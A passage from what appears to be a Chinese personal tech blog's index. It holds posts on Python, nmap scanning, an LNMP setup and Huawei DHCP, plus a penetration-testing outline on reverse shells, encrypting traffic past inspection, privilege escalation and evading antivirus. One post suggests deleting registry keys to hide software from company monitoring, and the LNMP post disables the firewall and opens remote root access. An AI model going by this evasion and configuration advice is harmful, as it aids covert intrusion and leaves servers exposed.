传入参数:函数体(一行代码)</code></pre><ul><li>lambda是关键字，表示定义匿名函数</li><li>传入参数表示匿名函数的形式参数，如：x,y表示2个形式参数</li><li>函数体，就是函数的执行逻辑，要注意：只能写一行，无法写多行</li></ul><p>示例：</p><pre><code class="python">def test_func(compute):    result = compute(1,2)    print(result)test_func(lambda x,y:x+y)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码格式规范</title>
      <link href="/2024/04/24/%E5%BC%80%E5%8F%91/%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F%E8%A7%84%E8%8C%83/"/>
      <url>/2024/04/24/%E5%BC%80%E5%8F%91/%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<h1 id="代码格式规范"><a href="#代码格式规范" class="headerlink" title="代码格式规范"></a>代码格式规范</h1><p>1.代码需要先保存，在执行</p><p>2.一句代码单独占一行</p><p>3.语法中的符号必须使用英文</p><p>4.代码前不要有多余的空格</p><p>5.文件名不要使用数字开头，避免一些特殊符号</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows程序卸载面板移除</title>
      <link href="/2024/04/16/%E6%8A%98%E8%85%BE/windows%E7%A8%8B%E5%BA%8F%E5%8D%B8%E8%BD%BD%E9%9D%A2%E6%9D%BF%E7%A7%BB%E9%99%A4/"/>
      <url>/2024/04/16/%E6%8A%98%E8%85%BE/windows%E7%A8%8B%E5%BA%8F%E5%8D%B8%E8%BD%BD%E9%9D%A2%E6%9D%BF%E7%A7%BB%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<p>Windows安装程序后能从控制面板中的卸载找到卸载入口，其实就是通过注册表写入对应键<br>位置一</p><pre><code class="moonscript">计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</code></pre><p>位置二</p><pre><code class="moonscript">计算机\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall</code></pre><p>位置三</p><pre><code class="javascript">计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\</code></pre><p>安装面板的程序卸载键都在注册表下的Uninstall里面</p><blockquote><p>可以利用删除注册表键实现<br>1.公司安装软件监控系统，逃避检测</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 折腾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nessus漏扫分析工具</title>
      <link href="/2024/04/10/%E7%BD%91%E5%AE%89/nessus%E6%BC%8F%E6%89%AB%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/10/%E7%BD%91%E5%AE%89/nessus%E6%BC%8F%E6%89%AB%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 网安 </tag>
            
            <tag> 扫描 </tag>
            
            <tag> nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap扫描器</title>
      <link href="/2024/04/09/%E7%BD%91%E5%AE%89/nmap%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
      <url>/2024/04/09/%E7%BD%91%E5%AE%89/nmap%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、基础扫描"><a href="#一、基础扫描" class="headerlink" title="一、基础扫描"></a>一、基础扫描</h1><h2 id="1-扫描IP"><a href="#1-扫描IP" class="headerlink" title="1.扫描IP"></a>1.扫描IP</h2><pre><code class="shell">nmap -sn 192.168.116.0/24 192.168.116.1-255</code></pre><h2 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h2><p>基于SYN包扫描：</p><pre><code class="shell">nmap -sS 192.168.116.101</code></pre><p>基于三次握手扫描:</p><pre><code class="shell">nmap -sT 192.168.116.101</code></pre><h2 id="3-指定端口扫描"><a href="#3-指定端口扫描" class="headerlink" title="3.指定端口扫描"></a>3.指定端口扫描</h2><p>指定范围内端口</p><pre><code class="shell">nmap -p 10-200 192.168.116.101</code></pre><p>指定多个端口</p><pre><code class="shell">nmap -p 21,22,25,80,445,3306,8080,8888 192.168.116.101</code></pre><p>指定所有端口</p><pre><code class="shell">nmap -p - 192.168.116.101</code></pre><h2 id="4-扫描端口和版本"><a href="#4-扫描端口和版本" class="headerlink" title="4.扫描端口和版本"></a>4.扫描端口和版本</h2><pre><code class="shell">nmap -sV 192.168.116.101</code></pre><h2 id="5-扫描操作系统"><a href="#5-扫描操作系统" class="headerlink" title="5.扫描操作系统"></a>5.扫描操作系统</h2><pre><code class="shell">sudo nmap -O 192.168.116.101</code></pre><h2 id="6-全面扫描"><a href="#6-全面扫描" class="headerlink" title="6.全面扫描"></a>6.全面扫描</h2><pre><code class="shell">nmap -A 192.168.116.101</code></pre><h1 id="二、内置脚本扫描"><a href="#二、内置脚本扫描" class="headerlink" title="二、内置脚本扫描"></a>二、内置脚本扫描</h1><p>所有扫描脚本都在kali目录下的 &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts，具体用法参考<a href="https://nmap.org/nsedoc/">nse官方文档</a><br>1.常见端口的漏洞扫描</p><pre><code class="shell">nmap --script=vuln 192.168.116.101</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 网安 </tag>
            
            <tag> 扫描 </tag>
            
            <tag> namp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提取和内网穿透工具</title>
      <link href="/2024/04/09/%E7%BD%91%E5%AE%89/%E6%8F%90%E5%8F%96%E5%92%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/09/%E7%BD%91%E5%AE%89/%E6%8F%90%E5%8F%96%E5%92%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、权限提升"><a href="#一、权限提升" class="headerlink" title="一、权限提升:"></a>一、权限提升:</h1><h2 id="1-MSF"><a href="#1-MSF" class="headerlink" title="1.MSF"></a>1.MSF</h2><h2 id="二、内网渗透"><a href="#二、内网渗透" class="headerlink" title="二、内网渗透:"></a>二、内网渗透:</h2><h2 id="1-Cobalt-Strike"><a href="#1-Cobalt-Strike" class="headerlink" title="1.Cobalt Strike"></a>1.Cobalt Strike</h2><h2 id="2-Ladon"><a href="#2-Ladon" class="headerlink" title="2.Ladon"></a>2.Ladon</h2><h2 id="3-PSTools"><a href="#3-PSTools" class="headerlink" title="3.PSTools"></a>3.PSTools</h2><h2 id="三、内网穿透"><a href="#三、内网穿透" class="headerlink" title="三、内网穿透:"></a>三、内网穿透:</h2><h2 id="1-Frp"><a href="#1-Frp" class="headerlink" title="1.Frp"></a>1.Frp</h2><h2 id="2-冰蝎"><a href="#2-冰蝎" class="headerlink" title="2.冰蝎"></a>2.冰蝎</h2><h2 id="3-Cobalt-Strike"><a href="#3-Cobalt-Strike" class="headerlink" title="3.Cobalt Strike"></a>3.Cobalt Strike</h2>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透思路</title>
      <link href="/2024/04/07/%E7%BD%91%E5%AE%89/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
      <url>/2024/04/07/%E7%BD%91%E5%AE%89/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h1><h2 id="1、主机扫描"><a href="#1、主机扫描" class="headerlink" title="1、主机扫描"></a>1、主机扫描</h2><p>(1)扫描某个网段内存在的主机<br>(2)扫描主机开放的端口和服务<br>(3)扫描主机的操作系统和版本号<br>(4)扫描主机可能存在的已知漏洞</p><h2 id="2、Web扫描"><a href="#2、Web扫描" class="headerlink" title="2、Web扫描"></a>2、Web扫描</h2><p>(1)查询域名和子域名信息<br>(2)查询whoid信息<br>(3)扫描Web应用的URL路径<br>(4)扫描Web应用后台管理入口<br>(5)常规漏洞扫描</p><h2 id="3、功能分析"><a href="#3、功能分析" class="headerlink" title="3、功能分析"></a>3、功能分析</h2><p>(1)分析前台页面的登录注册功能<br>(2)根据用户注册提示确定可用账号<br>(3)尝试进行注册并登录，确认各项功能<br>(4)确定前台页面的URL跳转、用户评论、文件引用、文件上传、文件下载等强交互功能点<br>(5)确定后台是否存在文件上传、查询功能、命令功能、系统配置等<br>(6)确定用户是否存在密码重置功能，确认是否存在逻辑漏洞</p><h2 id="4、抓包分析"><a href="#4、抓包分析" class="headerlink" title="4、抓包分析"></a>4、抓包分析</h2><p>(1)对前端页面的源代码进行分析，确认是否存在敏感信息或接口<br>(2)对关键功能进行抓包分析，预判后台基本实现逻辑<br>(3)对系统功能交互过程的编码和加密进行分析，如是香使用Base64编码、时间截、Hash(4)对通信过程的Sesslon和Cookle进行分析，判断为什么此处要这么用</p><h2 id="5、使用的工具"><a href="#5、使用的工具" class="headerlink" title="5、使用的工具"></a>5、使用的工具</h2><p>(1)主机扫描:NMap、Nessus<br>(2)Web扫描:XRay+Rad、AWs、AppScan、SQLMap、XSStrike、dirb、御剑等<br>(3)在线搜集:zoomeye.org、fofa.so、shodan.io、微步、城名注册南如万网等</p><h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="1、已知exp使用"><a href="#1、已知exp使用" class="headerlink" title="1、已知exp使用"></a>1、已知exp使用</h2><p>根据信息搜集结果，直接网上寻找对应开发框架或CMS的成熟漏洞利用工具，如struts2的全家桶</p><h2 id="2、暴力破解"><a href="#2、暴力破解" class="headerlink" title="2、暴力破解"></a>2、暴力破解</h2><p>适用于验证码可绕过，使用top1000等各类字典，也可以根据搜集到的密码规则匹配相应账号使用hashcat自行创建字典。burpsuite的赛力破解模块也提供了多样化的字典生成功能。或使用专有工具如Hydra、SNetCracker等，或根据业务需要自己编写Python脚本，</p><h2 id="3、逻辑漏洞"><a href="#3、逻辑漏洞" class="headerlink" title="3、逻辑漏洞"></a>3、逻辑漏洞</h2><p>尤其是密码重置，很关键，根据经验来看，至少可从七个方面攻击密码找回功能:重置凭证接收端可篇改、重置凭证泄漏、重置凭证未校验、重置凭证可暴破、用户混淆、应答中存在影响后续逻辑的状态参数、token 可预测。在逻辑漏洞的找寻中，重点观察跟你用户名有关的请求，尝试在各种请求中将你的用户名或身份认证替换成他人的。</p><h2 id="4、JS信息泄露"><a href="#4、JS信息泄露" class="headerlink" title="4、JS信息泄露"></a>4、JS信息泄露</h2><p>一般内部系统的网站JS可能会存有用户接口，我们可以通过接口发现用户信息。也可以分析JS的代码，构造出后台路径和参数逻辑。</p><h2 id="5、后台WEB漏洞"><a href="#5、后台WEB漏洞" class="headerlink" title="5、后台WEB漏洞"></a>5、后台WEB漏洞</h2><p>除了在信息搜集中提到的上传功能(上传webshell)、查询功能(sql注入)、命令功能(命令注入)外，其他web安全漏洞都最好根据功能逐一尝试。</p><h2 id="6、代码审计"><a href="#6、代码审计" class="headerlink" title="6、代码审计"></a>6、代码审计</h2><p>如果拿到源码，可以根据审计结果构造payload</p><h2 id="7、使用到的工具"><a href="#7、使用到的工具" class="headerlink" title="7、使用到的工具"></a>7、使用到的工具</h2><p>(1)渗透测试:Hydra，Medusa、MetaSploit Framework、反序列化工具、各类专项工具<br>(2)代码审计:RIPS、Fortify SCA<br>(3)Shell管理:菜刀、冰蝎、蚁剑、哥斯拉、PSTool等</p><h1 id="三、建立据点"><a href="#三、建立据点" class="headerlink" title="三、建立据点"></a>三、建立据点</h1><h2 id="1、反弹shell"><a href="#1、反弹shell" class="headerlink" title="1、反弹shell"></a>1、反弹shell</h2><p>漏洞利用成功时，通常会在目标机上获得一个webshell，但是webshell虽然能执行命令和管理文件，但毕竟不是真正的shell，而且也不稳定，因此就需要反弹shell到一个稳定的环境中。</p><h2 id="2、反弹shell时候可能遇到的问题"><a href="#2、反弹shell时候可能遇到的问题" class="headerlink" title="2、反弹shell时候可能遇到的问题"></a>2、反弹shell时候可能遇到的问题</h2><p>反弹命令不存在、禁止出口流量、限定向外访问端口、流是审查<br>(1)反弹命令不存在：命令有很多，常用命令有nc&#x2F;nc.openbsd&#x2F;nc.traditional、bash&#x2F;sh&#x2F;dash、python&#x2F;perl&#x2F;PHP&#x2F;ruby、exec，因此命令不存在的概率很小;在服务器上使用’whereis nc bash php perl python ruby’就能知道命令是否存在;</p><p>(2)禁止出口流量：某些目标在防火墙上限制了出口流量，禁止目标主动向外发起网络请求，可以通过带外(Out OfBand)的方式进行验证。大致逻辑是，在攻击者自己的 VPS 上监测某种协议的网络请求，在目标上用这种协议访问 VPS，若在 VPS上看到该协议的请求日志，则可推断出目标允许出口流量;</p><p>(3)限定向外访问端口:某些目标限定访问外部端口，常见黑名单和白名单两种方式。黑名单，比如，禁止目标机器向外访问 MSF 默认的 4444 端口；白名单，比如，只允许向外访问 web 常见的 80 端口、黑名单的情况好绕过，随便指定一个端口号就行，白名单的话就只能探测可允许端口，常见就是80和443,需要想办法利用。</p><p>(4)流量审查：目标环境会对所有流星进行检查，检查的时候会发现流量中的恶意代码信息，这种情况可以结合上面的443端口，使用攻击者的VPS创建sS证书公钥&#x2F;私钥对，VPS开启openssl监听，然后使用openssl对反弹shell的流量进行加密，这样就能防止流量审查反弹成功。</p><h2 id="3、确认环境并制作木马"><a href="#3、确认环境并制作木马" class="headerlink" title="3、确认环境并制作木马"></a>3、确认环境并制作木马</h2><p>(1)确认具体的操作系统版本和已经安装的服务，可以运行的脚本环境，可以通过的端口等(具体根据权限而定)<br>(2)根据当前环境，按照需要制作复杂木马，甚至想办法保持连接的稳定，不被防火墙和管理员发现和封锁等。</p><h2 id="4、使用的工具"><a href="#4、使用的工具" class="headerlink" title="4、使用的工具:"></a>4、使用的工具:</h2><p>MetaSploit Framework、 cobalt Strike等</p><h1 id="四、权限提升和内网渗透"><a href="#四、权限提升和内网渗透" class="headerlink" title="四、权限提升和内网渗透"></a>四、权限提升和内网渗透</h1><h2 id="1、权限提升"><a href="#1、权限提升" class="headerlink" title="1、权限提升"></a>1、权限提升</h2><p>Webshell中的90%都是www-data权限，需要想尽办法提升至root权限，可以用的办法有利用内核栈溢出提权、搜寻配置文件中的明文密码、环境变量劫持高权限程序、不安全的服务、借助权能(POSIX capabilities)提权、sudo 误配、SUID 滥用等等。这些可以查阅网上相关资料和方法，下载对应的exp完成。</p><h2 id="2、权限维持"><a href="#2、权限维持" class="headerlink" title="2、权限维持"></a>2、权限维持</h2><p>在获取了超级管理员权限后，还得想办法要将权限维持住</p><h2 id="3、内网穿透"><a href="#3、内网穿透" class="headerlink" title="3、内网穿透"></a>3、内网穿透</h2><p>在后渗透阶段，攻击进入一台目标主机是远远不够的，还需要通过内网横向移动来完成对核心目标的访问和渗透，此时通过内网穿透保持一个可靠连接，随时可以通过穿透功能进入目标主机。这一过程同样需要注意如何规避防病毒软件或防火墙的发现。</p><h2 id="4、内网渗透"><a href="#4、内网渗透" class="headerlink" title="4、内网渗透"></a>4、内网渗透</h2><p>当能够保持超级管理员的权限并进行维持后，此时便可以开展内网渗透工作，整体过程与外网渗透比较类似，但是面临 的实际情况并不完全一样，需要借助各类工具和经验进行处理，作为渗透测试的工作而非红方攻击来说，内网渗透并非最必要的一步，但是可以一试，进步确定目标主机的漏洞及影响范围。</p><h2 id="5、使用的工具-1"><a href="#5、使用的工具-1" class="headerlink" title="5、使用的工具"></a>5、使用的工具</h2><p>(1)权限提升:MSF、漏扫、各类专项渗透工具等<br>(2)内网渗透:Cobalt Strike、Ladon、PSTools等<br>(3)内网穿透:Frp、冰蝎、Cobalt Strike、代理等</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建立据点工具</title>
      <link href="/2024/04/07/%E7%BD%91%E5%AE%89/%E5%BB%BA%E7%AB%8B%E6%8D%AE%E7%82%B9%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/07/%E7%BD%91%E5%AE%89/%E5%BB%BA%E7%AB%8B%E6%8D%AE%E7%82%B9%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="1-MetaSploit-Framework"><a href="#1-MetaSploit-Framework" class="headerlink" title="1.MetaSploit Framework"></a>1.MetaSploit Framework</h2><h2 id="2-Cobalt-Strike"><a href="#2-Cobalt-Strike" class="headerlink" title="2.Cobalt Strike"></a>2.Cobalt Strike</h2>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞利用工具</title>
      <link href="/2024/04/07/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/07/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、渗透测试"><a href="#一、渗透测试" class="headerlink" title="一、渗透测试"></a>一、渗透测试</h1><h2 id="1-Hydra"><a href="#1-Hydra" class="headerlink" title="1.Hydra"></a>1.Hydra</h2><h2 id="2-Medusa"><a href="#2-Medusa" class="headerlink" title="2.Medusa"></a>2.Medusa</h2><h2 id="3-MetaSploit-Framework"><a href="#3-MetaSploit-Framework" class="headerlink" title="3.MetaSploit Framework"></a>3.MetaSploit Framework</h2><h2 id="4-反序列化工具"><a href="#4-反序列化工具" class="headerlink" title="4.反序列化工具"></a>4.反序列化工具</h2><h1 id="二、代码审计"><a href="#二、代码审计" class="headerlink" title="二、代码审计"></a>二、代码审计</h1><h2 id="1-RIPS"><a href="#1-RIPS" class="headerlink" title="1.RIPS"></a>1.RIPS</h2><h2 id="2-Fortify-SCA"><a href="#2-Fortify-SCA" class="headerlink" title="2.Fortify SCA"></a>2.Fortify SCA</h2><h1 id="三、shell管理"><a href="#三、shell管理" class="headerlink" title="三、shell管理"></a>三、shell管理</h1><h2 id="1-菜刀"><a href="#1-菜刀" class="headerlink" title="1.菜刀"></a>1.菜刀</h2><h2 id="2-冰蝎"><a href="#2-冰蝎" class="headerlink" title="2.冰蝎"></a>2.冰蝎</h2><h2 id="3-蚁剑"><a href="#3-蚁剑" class="headerlink" title="3.蚁剑"></a>3.蚁剑</h2><h2 id="4-哥斯拉"><a href="#4-哥斯拉" class="headerlink" title="4.哥斯拉"></a>4.哥斯拉</h2><h2 id="5-PSTool"><a href="#5-PSTool" class="headerlink" title="5.PSTool"></a>5.PSTool</h2>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安扫描工具</title>
      <link href="/2024/04/07/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/07/%E7%BD%91%E5%AE%89/%E7%BD%91%E5%AE%89%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、主机扫描"><a href="#一、主机扫描" class="headerlink" title="一、主机扫描"></a>一、主机扫描</h1><h2 id="1-nmap"><a href="#1-nmap" class="headerlink" title="1.nmap"></a>1.nmap</h2><pre><code class="javascript"> 主机发现、端口扫描、操作系统识别、配置和脚本检测</code></pre><p> <strong>下载链接</strong><br><a href="https://www.123pan.com/s/4DttVv-rJGov.html%E6%8F%90%E5%8F%96%E7%A0%81:ZxoB">123网盘-windows版本</a><br><a href="https://nmap.org/download.html">官网下载</a></p><h2 id="2-Nessus"><a href="#2-Nessus" class="headerlink" title="2.Nessus"></a>2.Nessus</h2><pre><code class="nginx">Nessus 是一款漏洞扫描与分析软件，其中漏洞库包含了数千种常见和已知的漏洞，可以对操作系统、网络设备、数据库、Web 应用程序等进行全面的扫描。通过使用预定义的合规性模板，Nessus能够自动检查目标系统是否符合相应的合规性要求，并生成相应的报告</code></pre><h1 id="二、web扫描"><a href="#二、web扫描" class="headerlink" title="二、web扫描"></a>二、web扫描</h1><h2 id="1-XRay-Rad"><a href="#1-XRay-Rad" class="headerlink" title="1.XRay+Rad"></a>1.XRay+Rad</h2><h2 id="2-AVWS"><a href="#2-AVWS" class="headerlink" title="2.AVWS"></a>2.AVWS</h2><h2 id="3-AppScan"><a href="#3-AppScan" class="headerlink" title="3.AppScan"></a>3.AppScan</h2><h2 id="4-SQLMap"><a href="#4-SQLMap" class="headerlink" title="4.SQLMap"></a>4.SQLMap</h2><h2 id="5-XSStrike"><a href="#5-XSStrike" class="headerlink" title="5.XSStrike"></a>5.XSStrike</h2><h2 id="6-dirb"><a href="#6-dirb" class="headerlink" title="6.dirb"></a>6.dirb</h2><h2 id="7-御剑"><a href="#7-御剑" class="headerlink" title="7.御剑"></a>7.御剑</h2><h1 id="三、在线搜索"><a href="#三、在线搜索" class="headerlink" title="三、在线搜索"></a>三、在线搜索</h1><h2 id="1-zoomeye-org"><a href="#1-zoomeye-org" class="headerlink" title="1.zoomeye.org"></a>1.zoomeye.org</h2><h2 id="2-fofa-so"><a href="#2-fofa-so" class="headerlink" title="2.fofa.so"></a>2.fofa.so</h2><h2 id="3-shodan-io"><a href="#3-shodan-io" class="headerlink" title="3.shodan.io"></a>3.shodan.io</h2><h2 id="4-微步"><a href="#4-微步" class="headerlink" title="4.微步"></a>4.微步</h2><h2 id="5-域名注册商"><a href="#5-域名注册商" class="headerlink" title="5.域名注册商"></a>5.域名注册商</h2>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>armbian_arm64架构下部署lnmp环境</title>
      <link href="/2024/03/18/linux/armbian_arm64%E6%9E%B6%E6%9E%84%E4%B8%8B%E9%83%A8%E7%BD%B2lnmp%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/03/18/linux/armbian_arm64%E6%9E%B6%E6%9E%84%E4%B8%8B%E9%83%A8%E7%BD%B2lnmp%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、基本设置"><a href="#一、基本设置" class="headerlink" title="一、基本设置"></a>一、基本设置</h1><p><strong>1.更新软件源</strong></p><pre><code class="bash">sudo apt-get updatesudo apt-get upgradesudo apt-get dist-upgrade</code></pre><p><strong>2.关闭防火墙</strong></p><pre><code class="bash"> vim /etc/ufw/ufw.conf //编辑配置文件ENABLED=no//将内容从yes值改为no</code></pre><h1 id="二、mysql安装与配置"><a href="#二、mysql安装与配置" class="headerlink" title="二、mysql安装与配置"></a>二、mysql安装与配置</h1><p><strong>1.安装mysql</strong></p><pre><code class="bash">sudo apt-get install mysql-server</code></pre><p><strong>2.启动mysql</strong></p><pre><code class="bash">sudo systemctl start mysql sudo systemctl enable mysql</code></pre><p><strong>3.修改mysql密码</strong></p><pre><code class="bash">mysql -u root -p//登录mysql默认密码为空，直接回车use mysql;CREATE USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;new_password&#39;;  // 创建局域网络账号GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39; WITH GRANT OPTION; // 分配权限ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;new_password&#39;;//new_password为新密码alter user &#39;root&#39;@&#39;%&#39; identified with mysql_native_password by &#39;new_password&#39;;  //远程密码FLUSH PRIVILEGES;//刷新权限使更改生效EXIT;//退出mysql</code></pre><p><strong>4.mysql修改配置文件开启远程</strong></p><pre><code class="gradle">vim /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre><p>修改配置文件，注释掉bind-address &#x3D; 127.0.0.1  和 mysqlx-bind-address    &#x3D; 127.0.0.1</p><p>4.重启mysql</p><pre><code class="maxima">systemctl restart mysql</code></pre><h1 id="三、php的安装"><a href="#三、php的安装" class="headerlink" title="三、php的安装"></a>三、php的安装</h1><p><strong>1.安装PHP及所需模块</strong></p><pre><code class="bash">sudo apt-get install php-fpm php-mysql php-common php-mbstring php-xml php-cli php-gd php-curlsudo systemctl start php8.1-fpm    //可能和我版本不一样，自查后修改sudo systemctl enable php8.1-fpm//可能和我版本不一样，自查后修改</code></pre><h1 id="四、nginx安装与配置"><a href="#四、nginx安装与配置" class="headerlink" title="四、nginx安装与配置"></a>四、nginx安装与配置</h1><p><strong>1.安装nginx并设置开机自启动</strong></p><pre><code class="bash">sudo apt-get install nginxsystemctl start nginx.service systemctl enable nginx.service </code></pre><p><strong>2.配置Nginx与PHP处理：</strong></p><p> 1)编辑配置文件</p><pre><code class="bash">sudo vim /etc/nginx/sites-available/default</code></pre><p>2)在文件中添加以下内容以处理PHP请求：(1.注意需要将内容包含到server{}中2.php*.*版本根据自身安装版本选择)</p><pre><code class="bash">location ~ \.php$ &#123;    include snippets/fastcgi-php.conf;    fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;&#125;</code></pre><p>3)之后将index.php 添加到server{}中，将默认识别改文件</p><pre><code class="delphi">index index.php index.html index.htm;</code></pre><p>4)测试并重启nginx服务<br>sudo nginx -t<br>sudo systemctl restart nginx</p><p>)其它需要参考模板修改</p><pre><code class="bash">server &#123;    listen 80;    server_name example.com;    root /var/www/html;     index index.php index.html index.htm;    error_log  /var/log/nginx/error.log;    access_log /var/log/nginx/access.log;     location / &#123;        try_files $uri $uri/ =404;    &#125;     location ~ \.php$ &#123;        include snippets/fastcgi-php.conf;        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock; # 根据PHP版本和配置调整        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include fastcgi_params;    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> armbian </tag>
            
            <tag> arm64 </tag>
            
            <tag> lnmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为设备开启dhcp服务</title>
      <link href="/2024/03/11/%E7%BD%91%E7%BB%9C/%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%BC%80%E5%90%AFdhcp%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/03/11/%E7%BD%91%E7%BB%9C/%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%BC%80%E5%90%AFdhcp%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="华为设备开启dhcp服务"><a href="#华为设备开启dhcp服务" class="headerlink" title="华为设备开启dhcp服务"></a>华为设备开启dhcp服务</h1><p><img src="https://picture.tanglx.cn/web/2024/1710146368786.png"><br><strong>1.对AR1路由器进行配置</strong></p><pre><code class="text">&lt;AR1&gt;system-view //进入系统视图[AR1]int GigabitEthernet 0/0/0//进入接口[AR1-GigabitEthernet0/0/0]ip add 192.168.1.1 255.255.255.0   //配置接口ip[AR1-GigabitEthernet0/0/0]quit//退到系统视图[AR1]dhcp enable//开启dhcp服务[AR1]int GigabitEthernet 0/0/0//进入接口[AR1-GigabitEthernet0/0/0]dhcp select interface   //指定接口开启dhcp</code></pre><p><strong>2.之后局域网下pc就能获取到ip地址</strong><br><img src="https://picture.tanglx.cn/web/2024/1710146299692.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 数通 </tag>
            
            <tag> 华为 </tag>
            
            <tag> 命令 </tag>
            
            <tag> dhcp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为数通命令集</title>
      <link href="/2024/03/11/%E7%BD%91%E7%BB%9C/%E5%8D%8E%E4%B8%BA%E6%95%B0%E9%80%9A%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
      <url>/2024/03/11/%E7%BD%91%E7%BB%9C/%E5%8D%8E%E4%B8%BA%E6%95%B0%E9%80%9A%E5%91%BD%E4%BB%A4%E9%9B%86/</url>
      
